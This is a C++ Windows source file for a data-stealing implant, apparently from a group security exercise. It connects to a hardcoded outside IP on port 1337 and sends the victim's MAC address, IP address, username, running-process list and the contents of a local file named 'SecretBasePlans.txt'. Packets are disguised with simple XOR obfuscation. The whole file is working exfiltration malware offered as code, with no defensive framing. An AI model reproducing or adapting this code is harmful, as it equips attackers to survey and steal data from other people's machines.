#include "stdafx.h"

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <iostream> 
#include <WinSock2.h>

#include "Comms.h"
#include "GetMacAddress.h"
#include "GetUsername.h"
#include "GetIP.h"
#include "GetProcesses.h"


using namespace std;


void Encrypt(PACKET* p) {
	for (int i = 0; i < 4080; i++) {
		((char*)p)[i] = ((char*)p)[i] ^ 'i';
	}
}

SOCKET Connect() {
	const char *ip = "54.205.144.55";
	int port = 1337;

	WSADATA WSAData;
	SOCKET server;
	SOCKADDR_IN addr;

	WSAStartup(MAKEWORD(2, 0), &WSAData);
	server = socket(AF_INET, SOCK_STREAM, 0);

	addr.sin_addr.s_addr = inet_addr(ip);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	connect(server, (SOCKADDR *)&addr, sizeof(addr));
	
	return server;
}

PACKET* MakePacket() {
	PACKET *p = (PACKET*)malloc(sizeof(PACKET));
	
	strncpy(p->token, "R34PD3TH", 8);
	strncpy(p->type, "12345678", 8);
	memset(p->payload, 0, 4080);

	return p;
}

void SendMacAddress(SOCKET s) {
	PACKET* p = MakePacket();
	strncpy(p->type, "MACCADDR", 8);
	memcpy(p->payload, GetMACaddress(), 18);

	Encrypt(p);
	send(s, (char*)p, sizeof(PACKET), 0);
	printf("%s\n", p);

	//free(p->payload);
	free(p);
}

void SendIPAddress(SOCKET s) {
	PACKET* p = MakePacket();
	strncpy(p->type, "IPIPADDR", 8);
	char* ip = GetIP();
	memcpy(p->payload, ip, 16);

	Encrypt(p);
	send(s, (char*)p, sizeof(PACKET), 0);
	puts((char*)p);

	free(p);
}

void SendUsername(SOCKET s) {
	PACKET *p = MakePacket();
	strncpy(p->type, "USERNAME", 8);

	WCHAR* username = GetUser();
	wcstombs(p->payload, username, 4080);
	//memcpy(p->payload, username, wcslen(username));

	Encrypt(p);
	send(s, (char*)p, sizeof(PACKET), 0);
	puts((char*)p);

	free(p);
}

void SendProcs(SOCKET s) {
	PACKET* p = MakePacket();
	strncpy(p->type, "PROCSPLZ", 8);

	int numProcesses;
	char* processNames = GetProcesses(&numProcesses);
	strncpy(p->payload, processNames, 4080);

	send(s, (char*)p, sizeof(PACKET), 0);
	printf("%d processes\n", numProcesses);
	printf("%s", processNames);
}

void SendSecretFile(SOCKET s) {
	PACKET* p = MakePacket();
	strncpy(p->type, "STORETXT",8);


	char* buf = (char*)malloc(4080);
	DWORD n = 0;

	FILE* f = fopen("C:\\Users\\Group10\\Downloads\\SecretBasePlans.txt", "r");
	fread(buf, 4079, 1, f);
	fclose(f);
	strncpy(p->payload, buf, 4080);

	send(s, (char*)p, sizeof(PACKET), 0);
	puts((char*)p);
}